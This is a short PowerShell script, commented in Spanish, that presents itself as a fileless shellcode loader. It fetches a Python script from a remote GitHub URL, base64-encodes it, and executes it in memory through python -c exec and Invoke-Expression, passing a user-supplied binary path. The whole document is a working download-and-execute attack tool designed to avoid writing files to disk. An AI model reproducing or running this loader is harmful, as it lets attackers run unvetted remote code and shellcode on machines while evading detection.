param(
    [Parameter(Mandatory=$true)]
    [string]$BinPath
)

cls
Write-Host "[+] Iniciando shellcode loader (fileless)" -ForegroundColor Cyan

$PythonScriptUrl = "https://raw.githubusercontent.com/AL4AROX/CodeBin/main/shell.py"

# Descargar código Python
$pythonCode = (Invoke-WebRequest -Uri $PythonScriptUrl -UseBasicParsing).Content

# Ejecutar Python con el código directamente (sin archivo)
# Usamos -- para pasar argumentos después del comando -c
$encodedCode = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($pythonCode))
$command = "python -c `"import base64; exec(base64.b64decode('$encodedCode').decode('utf-8'))`" `"$BinPath`""
Invoke-Expression $command
